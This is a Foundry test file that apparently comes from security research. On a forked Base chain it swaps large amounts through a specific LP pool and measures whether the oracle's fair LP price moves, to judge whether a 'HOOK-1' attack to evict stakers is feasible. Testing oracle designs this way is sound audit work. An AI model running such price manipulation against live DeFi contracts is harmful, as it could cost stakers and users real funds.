// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IOracle { function getUnderlyingPrice(address) external returns (uint256); }
interface IAeroPool {
    function getReserves() external view returns (uint256, uint256, uint256);
    function swap(uint256 a0, uint256 a1, address to, bytes calldata data) external;
    function getAmountOut(uint256 amountIn, address tokenIn) external view returns (uint256);
}
interface IERC20 { function transfer(address,uint256) external returns (bool); function balanceOf(address) external view returns(uint256); }

/**
 * Follow-up to BLPPriceModel: a DONATION raised the fair price by sqrt(reserve ratio),
 * which is the signature of a fair sqrt(k) LP price using EXTERNAL token prices (a spot-ratio
 * model would have left the price unchanged under a one-sided reserve change). The HOOK-1
 * eviction attack needs to DECREASE the price, which a swap can only do if the model is
 * spot-based. This test performs real swaps (k stays ~constant) and measures the price move.
 * If swaps barely move the fair price, HOOK-1's "move the $27 pool to evict stakers" is dead.
 */
contract BLPSwapManipTest is Test {
    address constant ORACLE = 0x4B60aA7777c96D595c4a662B654D73F579fF3650;
    address constant BLP    = 0xB0770d4f5c430b1C3C832c62Ac1AB12B49c9D277;
    address constant UTS    = 0x3B6564b5DA73A41d3A66e6558a98FD0e9E1e77ad; // token0
    address constant USX    = 0xc142171B138DB17a1B7Cb999C44526094a4dae05; // token1

    function setUp() public { vm.createSelectFork(vm.rpcUrl("base"), vm.envUint("PIN_BLOCK")); }

    // Swap a large amount of UTS -> USX (respecting the AMM invariant). k rises only by fee.
    function test_swap_downDirection() public {
        uint256 p0 = IOracle(ORACLE).getUnderlyingPrice(BLP);
        (uint256 r0, uint256 r1, ) = IAeroPool(BLP).getReserves();

        uint256 amtIn = r0 * 10; // 10x the UTS reserve in
        deal(UTS, address(this), amtIn);
        uint256 out = IAeroPool(BLP).getAmountOut(amtIn, UTS);
        emit log_named_uint("USX out for 10x-reserve UTS in", out);
        require(out < r1, "out exceeds reserve");
        IERC20(UTS).transfer(BLP, amtIn);
        IAeroPool(BLP).swap(0, out, address(this), "");

        (uint256 r0b, uint256 r1b, ) = IAeroPool(BLP).getReserves();
        uint256 p1 = IOracle(ORACLE).getUnderlyingPrice(BLP);
        emit log_named_uint("k before (r0*r1)", r0 * r1);
        emit log_named_uint("k after  (r0*r1)", r0b * r1b);
        emit log_named_uint("price before", p0);
        emit log_named_uint("price after ", p1);
        uint256 mv = p1 > p0 ? (p1 - p0) * 10000 / p0 : (p0 - p1) * 10000 / p0;
        emit log_named_uint("price move via SWAP (bps)", mv);
    }

    // Swap the other way: USX -> UTS (buy up the scarce side).
    function test_swap_upDirection() public {
        uint256 p0 = IOracle(ORACLE).getUnderlyingPrice(BLP);
        (uint256 r0, uint256 r1, ) = IAeroPool(BLP).getReserves();

        uint256 amtIn = r1 / 2; // half the USX reserve in
        deal(USX, address(this), amtIn);
        uint256 out = IAeroPool(BLP).getAmountOut(amtIn, USX);
        require(out < r0, "out exceeds reserve");
        IERC20(USX).transfer(BLP, amtIn);
        IAeroPool(BLP).swap(out, 0, address(this), "");

        (uint256 r0b, uint256 r1b, ) = IAeroPool(BLP).getReserves();
        uint256 p1 = IOracle(ORACLE).getUnderlyingPrice(BLP);
        emit log_named_uint("k before", r0 * r1);
        emit log_named_uint("k after ", r0b * r1b);
        emit log_named_uint("price before", p0);
        emit log_named_uint("price after ", p1);
        uint256 mv = p1 > p0 ? (p1 - p0) * 10000 / p0 : (p0 - p1) * 10000 / p0;
        emit log_named_uint("price move via SWAP (bps)", mv);
    }
}
